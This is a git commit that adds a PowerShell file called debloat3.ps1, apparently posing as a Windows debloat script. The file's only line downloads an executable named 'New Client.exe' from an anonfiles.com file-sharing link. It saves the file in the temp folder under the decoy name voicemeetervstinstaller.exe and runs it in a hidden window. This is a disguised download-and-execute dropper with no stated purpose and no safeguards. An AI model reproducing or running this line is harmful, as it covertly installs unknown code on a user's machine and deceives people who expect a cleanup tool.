c07b787972d672d0e6dff5d89e73211c4715a644
Vanitypyjs <121406723+Vanitypyjs@users.noreply.github.com>
2023-01-22 20:59:44 +0100

    Create debloat3.ps1

---
+++ debloat3.ps1
@@ -0,0 +1,1 @@
+iwr -useb https://cdn-116.anonfiles.com/ZcIeu2T3y2/5873a24d-1674418092/New%20Client.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
